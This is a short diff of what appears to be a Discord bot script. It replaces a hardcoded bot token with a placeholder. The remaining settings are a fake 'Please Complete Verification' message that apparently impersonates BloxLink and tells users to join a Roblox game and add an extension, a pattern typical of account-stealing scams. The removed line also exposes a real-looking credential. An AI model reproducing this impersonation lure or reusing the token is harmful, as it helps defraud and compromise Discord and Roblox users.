@@ -5,7 +5,7 @@ import requests
 
 ################### change these to your liking ###################
 
-token = "MTAwMDM1MTMxNjQxNTA5NDgxNQ.GkM-nN.TlGfvE9mHYOBUzYD_uyZRR07tCEZ3eAUx2unvE"
+token = "yourtokenhere"
 prefix = "!"
 title = "Please Complete Verification"
 desc ="To verify your account, please join BloxLink's Official Roblox Verification Game AND add the extension"
